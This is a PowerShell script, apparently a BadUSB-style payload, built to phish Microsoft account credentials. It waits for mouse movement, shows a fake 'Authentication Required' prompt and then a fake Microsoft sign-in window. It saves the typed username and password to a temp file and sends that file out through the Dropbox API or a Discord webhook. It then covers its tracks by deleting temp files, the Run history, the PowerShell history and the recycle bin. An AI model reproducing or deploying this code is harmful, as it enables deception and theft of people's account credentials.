# Debut du script1
$FileName = "credentials.txt"
$filePath = "$env:TEMP\$FileName"

function Get-Creds {
    Add-Type -AssemblyName PresentationCore,PresentationFramework,WindowsBase
    
    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Microsoft" 
        WindowStartupLocation="CenterScreen"
        ResizeMode="NoResize"
        Width="600" Height="700"
        Topmost="True"
        Background="#1F1F1F"
        WindowStyle="None"
        Foreground="White">
    <Grid Background="#1F1F1F">
        <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center" Width="500">
            <!-- Logo Microsoft -->
            <StackPanel Orientation="Horizontal" Height="50" Margin="0,0,0,40" VerticalAlignment="Center">
                <Rectangle Width="15" Height="15" Fill="#F25022" Margin="0,0,5,0"/>
                <Rectangle Width="15" Height="15" Fill="#7FBA00" Margin="0,0,5,0"/>
                <Rectangle Width="15" Height="15" Fill="#00A4EF" Margin="0,0,5,0"/>
                <Rectangle Width="15" Height="15" Fill="#FFB900" Margin="0,0,20,0"/>
                <TextBlock Text="Microsoft" FontSize="24" FontWeight="Bold" Foreground="White" VerticalAlignment="Center"/>
            </StackPanel>
            
            <!-- Titre -->
            <TextBlock Text="Se connecter" FontSize="32" FontWeight="Bold" Foreground="White" Margin="0,0,0,15"/>
            
            <!-- Sous-titre -->
            <TextBlock Text="Utilisez votre compte Microsoft." FontSize="15" Foreground="#C0C0C0" Margin="0,0,0,35"/>
            
            <!-- Email/Username -->
            <TextBlock Text="Adresse e-mail ou numero de telephone" FontSize="13" Foreground="#C0C0C0" Margin="0,0,0,10"/>
            <TextBox x:Name="UsernameBox" 
                     Padding="12" 
                     Height="40" 
                     Margin="0,0,0,15" 
                     Background="#2D2D2D"
                     Foreground="White"
                     BorderThickness="1"
                     BorderBrush="#0078D4"
                     FontSize="13"/>
            
            <!-- Lien Oublie -->
            <TextBlock TextAlignment="Left" Margin="0,0,0,25">
                <Hyperlink x:Name="ForgotLink" Foreground="#0078D4" Cursor="Hand" TextDecorations="None">Vous avez oublie votre nom d'utilisateur ?</Hyperlink>
            </TextBlock>
            
            <!-- Mot de passe -->
            <TextBlock Text="Mot de passe" FontSize="13" Foreground="#C0C0C0" Margin="0,0,0,10"/>
            <PasswordBox x:Name="PasswordBox" 
                         Padding="12" 
                         Height="40" 
                         Margin="0,0,0,25" 
                         Background="#2D2D2D"
                         Foreground="White"
                         BorderThickness="1"
                         BorderBrush="#0078D4"
                         FontSize="13"/>
            
            <!-- Message erreur -->
            <TextBlock x:Name="ErrorMessage" Text="" FontSize="12" Foreground="#E81123" Margin="0,0,0,20" TextWrapping="Wrap"/>
            
            <!-- Bouton Suivant -->
            <Button x:Name="SignInButton" 
                    Content="Suivant" 
                    Height="40" 
                    Margin="0,0,0,25"
                    Background="#0078D4" 
                    Foreground="White" 
                    FontSize="15"
                    FontWeight="SemiBold"
                    Cursor="Hand"
                    BorderThickness="0"/>
            
            <!-- Lien Creer compte -->
            <TextBlock TextAlignment="Center" Margin="0,0,0,0">
                <Run Text="Vous debutez avec Microsoft ? " Foreground="#C0C0C0"/>
                <Hyperlink x:Name="SignUpLink" Foreground="#0078D4" Cursor="Hand" TextDecorations="None">Creer un compte</Hyperlink>
            </TextBlock>
        </StackPanel>
    </Grid>
</Window>
"@
    
    $reader = [System.Xml.XmlNodeReader]::new([xml]$xaml)
    $window = [System.Windows.Markup.XamlReader]::Load($reader)
    
    $usernameBox = $window.FindName("UsernameBox")
    $passwordBox = $window.FindName("PasswordBox")
    $signInButton = $window.FindName("SignInButton")
    $errorMessage = $window.FindName("ErrorMessage")
    $signUpLink = $window.FindName("SignUpLink")
    $forgotLink = $window.FindName("ForgotLink")
    
    $script:result = $null
    
    $signInButton.Add_Click({
        if ([string]::IsNullOrWhiteSpace($usernameBox.Text) -or [string]::IsNullOrWhiteSpace($passwordBox.Password)) {
            $errorMessage.Text = "Veuillez remplir tous les champs"
        }
        else {
            $script:result = @{
                Username = $usernameBox.Text
                Password = $passwordBox.Password
            }
            $window.Close()
        }
    })
    
    $signUpLink.Add_Click({})
    $forgotLink.Add_Click({})
    $usernameBox.Focus() | Out-Null
    $window.ShowDialog() | Out-Null
    
    return $script:result
}

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell
    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){ break }
        else { $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime }
    }
}

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true){
    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
}
}

Pause-Script
Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'

$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "MessageBox Result: $Result" -ForegroundColor Yellow

$creds = Get-Creds

if ($creds -eq $null) {
    Write-Host "Pas de credentials" -ForegroundColor Red
    exit
}

Write-Host "Username: $($creds.Username)" -ForegroundColor Yellow
Write-Host "Password: $($creds.Password)" -ForegroundColor Yellow

$credString = "Username: $($creds.Username)`r`nPassword: $($creds.Password)"
$credString | Out-File -FilePath $filePath -Encoding UTF8 -Force
Write-Host "Fichier sauvegarde: $filePath" -ForegroundColor Green

function DropBox-Upload {
[CmdletBinding()]
param ([Parameter (Mandatory = $True, ValueFromPipeline = $True)][Alias("f")][string]$SourceFilePath) 
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $filePath}

function Upload-Discord {
[CmdletBinding()]
param ([parameter(Position=0,Mandatory=$False)][string]$file,[parameter(Position=1,Mandatory=$False)][string]$text)
$hookurl = "$dc"
$Body = @{ 'username' = $env:username; 'content' = $text }
if (-not ([string]::IsNullOrEmpty($text))){ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)}
if (-not ([string]::IsNullOrEmpty($file))){ curl.exe -F "file1=@$file" $hookurl }
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $filePath}

Get-ChildItem $env:TEMP -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -ne "credentials.txt" } | Remove-Item -Force -ErrorAction SilentlyContinue -Recurse

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f -ErrorAction SilentlyContinue

Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
